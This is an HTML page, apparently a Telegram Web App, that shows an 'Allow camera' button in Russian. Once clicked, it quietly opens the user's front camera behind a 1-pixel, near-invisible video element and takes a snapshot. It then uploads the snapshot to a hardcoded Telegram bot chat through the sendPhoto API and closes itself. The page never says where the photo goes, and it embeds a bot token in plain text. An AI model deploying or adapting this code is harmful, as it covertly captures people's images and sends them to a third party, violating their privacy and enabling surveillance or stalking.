<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;flex-direction:column;">
    <button id="btn" style="padding:20px 40px;font-size:24px;background:#0088cc;color:#fff;border:none;border-radius:10px;">📸 Разрешить камеру</button>
    <h1 id="status" style="margin-top:20px;"></h1>

    <video id="video" autoplay playsinline style="position:fixed;bottom:0;right:0;width:1px;height:1px;opacity:0.01;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');

        document.getElementById('btn').addEventListener('click', function() {
            this.style.display = 'none';
            status.innerText = '📸 Запуск...';

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', '7406666272');
                            formData.append('photo', blob, 'photo.jpg');

                            fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
                                method: 'POST',
                                body: formData
                            })
                            .then(res => res.json())
                            .then(data => {
                                status.innerText = data.ok ? '✅ Отправлено!' : '❌ Ошибка';
                                tg.close();
                            })
                            .catch(() => status.innerText = '❌ Ошибка сети');

                            stream.getTracks().forEach(t => t.stop());
                        }, 'image/jpeg', 0.8);
                    }, 500);
                })
                .catch(err => {
                    status.innerText = '❌ ' + err.message;
                });
        });
    </script>
</body>
</html>
